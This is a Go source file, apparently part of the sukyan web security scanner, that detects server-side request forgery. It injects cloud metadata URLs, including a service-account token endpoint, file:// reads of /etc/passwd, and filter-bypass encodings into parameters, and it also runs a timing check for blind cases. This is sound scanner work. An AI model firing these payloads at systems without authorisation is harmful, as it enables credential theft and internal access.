package active

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/pyneda/sukyan/db"
	"github.com/pyneda/sukyan/lib"
	"github.com/pyneda/sukyan/pkg/http_utils"
	"github.com/pyneda/sukyan/pkg/scan"
	scan_options "github.com/pyneda/sukyan/pkg/scan/options"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

// ssrfProbe pairs a payload aimed at a service only the target can reach with the
// fingerprints its response carries. Works where egress is filtered and OOB is dead.
type ssrfProbe struct {
	name       string
	payload    string
	indicators []string
	minHits    int // weak fingerprints need corroboration; unique ones do not
	confidence int
	evidence   string
}

var awsMetadataIndicators = []string{
	"ami-id", "ami-launch-index", "instance-id", "instance-type",
	"block-device-mapping", "reservation-id", "security-credentials",
	"AccessKeyId", "SecretAccessKey", "InstanceProfileArn",
}

var gcpMetadataIndicators = []string{
	"access_token", "expires_in", "token_type",
	"numeric-project-id", "service-accounts",
}

var azureMetadataIndicators = []string{
	"azEnvironment", "vmId", "subscriptionId", "resourceGroupName",
	"vmScaleSetName", "osProfile", "vmSize",
}

// ssrfCoreProbes run against every URL-ish insertion point.
var ssrfCoreProbes = []ssrfProbe{
	{
		name:       "AWS instance metadata (IMDSv1)",
		payload:    "http://169.254.169.254/latest/meta-data/",
		indicators: awsMetadataIndicators,
		minHits:    2,
		confidence: 95,
		evidence:   "the EC2 instance metadata service answered through the sink",
	},
	{
		name:       "Local file read via file:// scheme",
		payload:    "file:///etc/passwd",
		indicators: []string{"root:x:0:0"},
		minHits:    1,
		confidence: 95,
		evidence:   "the sink resolved a file:// URL and returned local file contents",
	},
	{
		name:       "GCP instance metadata",
		payload:    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
		indicators: gcpMetadataIndicators,
		minHits:    2,
		confidence: 95,
		evidence:   "the GCP metadata service returned a service-account token through the sink",
	},
	{
		name:       "Azure instance metadata",
		payload:    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		indicators: azureMetadataIndicators,
		minHits:    2,
		confidence: 95,
		evidence:   "the Azure instance metadata service answered through the sink",
	},
	{
		// Alibaba Cloud's IMDS; blocklists filter 169.254 but rarely this.
		name:       "Alternate metadata address (100.100.100.200)",
		payload:    "http://100.100.100.200/latest/meta-data/",
		indicators: awsMetadataIndicators,
		minHits:    2,
		confidence: 90,
		evidence:   "an alternate link-local metadata address answered through the sink",
	},
}

// ssrfBypassProbes only pay off against a sink that filters the plain address.
var ssrfBypassProbes = []ssrfProbe{
	{
		name:       "AWS metadata via userinfo-prefixed authority",
		payload:    "http://example.com@169.254.169.254/latest/meta-data/",
		indicators: awsMetadataIndicators,
		minHits:    2,
		confidence: 95,
		evidence:   "a userinfo-prefixed authority defeated the destination filter",
	},
	{
		name:       "AWS metadata via decimal IP",
		payload:    "http://2852039166/latest/meta-data/",
		indicators: awsMetadataIndicators,
		minHits:    2,
		confidence: 95,
		evidence:   "a decimal-encoded IP defeated the destination filter",
	},
	{
		name:       "AWS instance identity document",
		payload:    "http://169.254.169.254/latest/dynamic/instance-identity/document",
		indicators: []string{"accountId", "imageId", "instanceId", "availabilityZone", "privateIp"},
		minHits:    2,
		confidence: 95,
		evidence:   "the EC2 instance identity document was returned through the sink",
	},
	{
		name:       "Local file read via file:// scheme (Windows)",
		payload:    "file:///c:/windows/win.ini",
		indicators: []string{"; for 16-bit app support", "[fonts]", "[extensions]"},
		minHits:    1,
		confidence: 95,
		evidence:   "the sink resolved a file:// URL and returned local file contents",
	},
}

func ssrfProbesForMode(mode scan_options.ScanMode) []ssrfProbe {
	switch mode {
	case scan_options.ScanModeFast:
		return ssrfCoreProbes[:2]
	case scan_options.ScanModeFuzz:
		return append(append([]ssrfProbe{}, ssrfCoreProbes...), ssrfBypassProbes...)
	default:
		return ssrfCoreProbes
	}
}

// isURLLikeInsertionPoint gates the probe budget.
func isURLLikeInsertionPoint(point scan.InsertionPoint, mode scan_options.ScanMode) bool {
	if point.Type == scan.InsertionPointTypeFullBody {
		return false
	}
	if mode == scan_options.ScanModeFuzz {
		return true
	}
	if scan.IsLikelySSRFParameter(point.Name) {
		return true
	}
	if mode == scan_options.ScanModeFast {
		return false
	}
	return point.ValueType == lib.TypeURL || carriesEncodedURL(point.Value)
}

// CDN proxies carry the target percent-encoded in a path segment.
func carriesEncodedURL(value string) bool {
	if !strings.Contains(value, "%") {
		return false
	}
	decoded, err := url.QueryUnescape(value)
	if err != nil {
		return false
	}
	return lib.GuessDataType(decoded) == lib.TypeURL
}

// Fingerprints in the payload (echo) or the baseline are not payload-induced.
func matchedSSRFIndicators(probe ssrfProbe, responseBody, baselineBody string) []string {
	var matched []string
	for _, indicator := range probe.indicators {
		if strings.Contains(probe.payload, indicator) {
			continue
		}
		if baselineBody != "" && strings.Contains(baselineBody, indicator) {
			continue
		}
		if strings.Contains(responseBody, indicator) {
			matched = append(matched, indicator)
		}
	}
	return matched
}

func ssrfProbeFired(probe ssrfProbe, responseBody, baselineBody string) ([]string, bool) {
	matched := matchedSSRFIndicators(probe, responseBody, baselineBody)
	return matched, len(matched) >= probe.minHits
}

// Blind sinks leave no fingerprint. Both targets below are addresses any filter
// rejects without connecting, so a timing gap means a real connect attempt.
const (
	ssrfRefusedHost    = "127.0.0.1"    // refused immediately
	ssrfUnroutableHost = "10.255.255.1" // hangs until the server's timeout
	ssrfClosedPort     = "1"

	// 2s connect timeouts are common; the floor clears jitter, the ratio guards precision.
	ssrfTimingMinDelta         = 1200 * time.Millisecond
	ssrfTimingMinRatio         = 3.0
	ssrfTimingMaxFastResponse  = 2 * time.Second // above this, deltas mean nothing
	ssrfMaxTimingPointsPerItem = 2               // each check costs two connect timeouts
)

var ssrfHostParameterFragments = []string{"host", "server", "peer", "node", "ipaddr", "ip_addr"}

// isBareHostParameter marks points that take an address rather than a URL.
func isBareHostParameter(point scan.InsertionPoint) bool {
	if point.ValueType == lib.TypeURL || strings.Contains(point.Value, "://") {
		return false
	}
	lowered := strings.ToLower(point.Name)
	if lowered == "ip" || lowered == "host" {
		return true
	}
	for _, fragment := range ssrfHostParameterFragments {
		if strings.Contains(lowered, fragment) {
			return true
		}
	}
	return false
}

// Exact names only: a substring match claims "support"/"export", which the probe overwrites.
var ssrfPortParameterNames = []string{
	"port", "portno", "portnumber", "port_number", "targetport", "target_port",
	"dstport", "dst_port", "remoteport", "remote_port", "serverport", "server_port",
}

func isPortParameter(name string) bool {
	return lib.SliceContains(ssrfPortParameterNames, strings.ToLower(name))
}

// A host parameter takes the address alone; appending a port makes it unresolvable.
func timingProbePayloads(point scan.InsertionPoint) (refused string, unroutable string) {
	if isBareHostParameter(point) {
		return ssrfRefusedHost, ssrfUnroutableHost
	}
	return "http://" + ssrfRefusedHost + ":" + ssrfClosedPort + "/",
		"http://" + ssrfUnroutableHost + ":" + ssrfClosedPort + "/"
}

// Minimums over repeats, so one slow response cannot manufacture a delta.
func ssrfTimingConfirmsConnect(refused, unroutable time.Duration) bool {
	if refused <= 0 || refused > ssrfTimingMaxFastResponse {
		return false
	}
	if unroutable-refused < ssrfTimingMinDelta {
		return false
	}
	return float64(unroutable) >= ssrfTimingMinRatio*float64(refused)
}

type ssrfProbeResult struct {
	history  *db.History
	body     string
	duration time.Duration
}

type ssrfScanner struct {
	history  *db.History
	options  ActiveModuleOptions
	ctx      context.Context
	client   *http.Client
	auditLog zerolog.Logger
}

func (s *ssrfScanner) send(builders []scan.InsertionPointBuilder) (*ssrfProbeResult, error) {
	req, err := scan.CreateRequestFromInsertionPoints(s.history, builders)
	if err != nil {
		return nil, err
	}
	req = req.WithContext(s.ctx)

	start := time.Now()
	executionResult := http_utils.ExecuteRequest(req, http_utils.RequestExecutionOptions{
		Client:        s.client,
		CreateHistory: true,
		HistoryCreationOptions: http_utils.HistoryCreationOptions{
			Source:              db.SourceScanner,
			WorkspaceID:         s.options.WorkspaceID,
			TaskID:              s.options.TaskID,
			TaskJobID:           s.options.TaskJobID,
			ScanID:              s.options.ScanID,
			ScanJobID:           s.options.ScanJobID,
			CreateNewBodyStream: true,
		},
	})
	elapsed := time.Since(start)
	// Duration survives errors: a probe our own timeout cut short still measured the stall.
	if executionResult.Err != nil {
		return &ssrfProbeResult{duration: elapsed}, executionResult.Err
	}

	body, err := executionResult.History.ResponseBody()
	if err != nil {
		return &ssrfProbeResult{history: executionResult.History, duration: elapsed}, err
	}
	return &ssrfProbeResult{history: executionResult.History, body: string(body), duration: elapsed}, nil
}

func (s *ssrfScanner) report(result *db.History, confidence int, details string, extra []*db.History) {
	issue, err := db.CreateIssueFromHistoryAndTemplate(result, db.SsrfCode, details, confidence, "",
		&s.options.WorkspaceID, &s.options.TaskID, &s.options.TaskJobID, &s.options.ScanID, &s.options.ScanJobID)
	if err != nil || issue.IsEmpty() {
		return
	}
	if err := issue.AppendHistories(extra); err != nil {
		s.auditLog.Warn().Err(err).Uint("issue_id", issue.ID).Msg("Failed to link supporting histories to SSRF issue")
	}
}

// Stops at the first hit; further probes only add traffic.
func (s *ssrfScanner) signatureProbes(point scan.InsertionPoint, probes []ssrfProbe, baselineBody string) (bool, error) {
	for _, probe := range probes {
		select {
		case <-s.ctx.Done():
			return false, s.ctx.Err()
		default:
		}

		result, err := s.send([]scan.InsertionPointBuilder{{Point: point, Payload: probe.payload}})
		if err != nil {
			s.auditLog.Debug().Err(err).Str("probe", probe.name).Msg("Failed to send in-band SSRF probe")
			continue
		}

		matched, fired := ssrfProbeFired(probe, result.body, baselineBody)
		if !fired {
			continue
		}

		s.auditLog.Warn().
			Str("insertionPoint", point.String()).
			Str("probe", probe.name).
			Strs("indicators", matched).
			Msg("In-band SSRF confirmed")

		details := fmt.Sprintf(`Probe: %s
Insertion point: %s
Payload: %s
Response status: %d
Matched response fingerprints: %s

The fingerprints appear neither in the payload nor in the unmodified response, so echoing the injected value cannot have produced them — %s.`,
			probe.name, point.String(), probe.payload, result.history.StatusCode,
			strings.Join(matched, ", "), probe.evidence)

		s.report(result.history, probe.confidence, details, nil)
		return true, nil
	}
	return false, nil
}

func (s *ssrfScanner) timingProbe(point scan.InsertionPoint, portPoint *scan.InsertionPoint) (bool, error) {
	refusedPayload, unroutablePayload := timingProbePayloads(point)

	measure := func(payload string) (*ssrfProbeResult, error) {
		builders := []scan.InsertionPointBuilder{{Point: point, Payload: payload}}
		if portPoint != nil {
			builders = append(builders, scan.InsertionPointBuilder{Point: *portPoint, Payload: ssrfClosedPort})
		}
		return s.send(builders)
	}

	var refused, unroutable time.Duration
	var evidence []*db.History
	var slowest *db.History

	for round := 0; round < 2; round++ {
		select {
		case <-s.ctx.Done():
			return false, s.ctx.Err()
		default:
		}

		fast, err := measure(refusedPayload)
		if err != nil {
			return false, nil
		}
		slow, _ := measure(unroutablePayload)
		if slow == nil {
			return false, nil
		}
		evidence = append(evidence, fast.history)
		if slow.history != nil {
			slowest = slow.history
		}

		if refused == 0 || fast.duration < refused {
			refused = fast.duration
		}
		if unroutable == 0 || slow.duration < unroutable {
			unroutable = slow.duration
		}
		// Stop before paying for a second timeout we already know cannot qualify.
		if round == 0 && unroutable-refused < ssrfTimingMinDelta {
			return false, nil
		}
	}

	if !ssrfTimingConfirmsConnect(refused, unroutable) {
		return false, nil
	}
	if slowest == nil { // every unrouted probe was cut short, so no response was stored
		if len(evidence) == 0 {
			return false, nil
		}
		slowest, evidence = evidence[0], evidence[1:]
	}

	s.auditLog.Warn().
		Str("insertionPoint", point.String()).
		Dur("refused", refused).
		Dur("unroutable", unroutable).
		Msg("Blind SSRF confirmed by connection-timing differential")

	details := fmt.Sprintf(`Oracle: connection-timing differential (blind sink)
Insertion point: %s
Refused target %s responded in %s
Unrouted target %s responded in %s

Both targets are private addresses a destination filter rejects without connecting, each measured twice with the minimum taken. Only a server that opened the connection can stall on the unrouted one, and the fetched response is never returned, so this sink is blind.`,
		point.String(), refusedPayload, refused.Round(time.Millisecond),
		unroutablePayload, unroutable.Round(time.Millisecond))

	s.report(slowest, 80, details, evidence)
	return true, nil
}

// SSRFInBandScan proves the forged request happened without an out-of-band channel.
func SSRFInBandScan(history *db.History, options ActiveModuleOptions, insertionPoints []scan.InsertionPoint) (bool, error) {
	auditLog := log.With().Str("audit", "ssrf-inband").Str("url", history.URL).Uint("workspace", options.WorkspaceID).Logger()

	ctx := options.Ctx
	if ctx == nil {
		ctx = context.Background()
	}

	select {
	case <-ctx.Done():
		auditLog.Info().Msg("In-band SSRF scan cancelled before starting")
		return false, ctx.Err()
	default:
	}

	var candidates []scan.InsertionPoint
	var portPoint *scan.InsertionPoint
	for _, point := range insertionPoints {
		if isPortParameter(point.Name) && portPoint == nil {
			portPoint = &point
		}
		if isURLLikeInsertionPoint(point, options.ScanMode) {
			candidates = append(candidates, point)
		}
	}
	if len(candidates) == 0 {
		auditLog.Debug().Msg("No URL-like insertion points to test for in-band SSRF")
		return false, nil
	}

	baselineBody := ""
	if body, err := history.ResponseBody(); err == nil {
		baselineBody = string(body)
	} else {
		auditLog.Debug().Err(err).Msg("Could not read baseline response body; indicator suppression disabled")
	}

	client := options.HTTPClient
	if client == nil {
		client = http_utils.CreateHttpClient()
	}

	scanner := &ssrfScanner{history: history, options: options, ctx: ctx, client: client, auditLog: auditLog}
	probes := ssrfProbesForMode(options.ScanMode)
	found := false
	timingBudget := ssrfMaxTimingPointsPerItem

	for _, point := range candidates {
		fired, err := scanner.signatureProbes(point, probes, baselineBody)
		if err != nil {
			return found, err
		}
		if fired {
			found = true
			continue
		}

		// The timing oracle is the slowest check, so only a named sink earns it.
		if timingBudget == 0 || options.ScanMode == scan_options.ScanModeFast || !scan.IsLikelySSRFParameter(point.Name) {
			continue
		}
		timingBudget--

		fired, err = scanner.timingProbe(point, portPoint)
		if err != nil {
			return found, err
		}
		if fired {
			found = true
		}
	}

	return found, nil
}
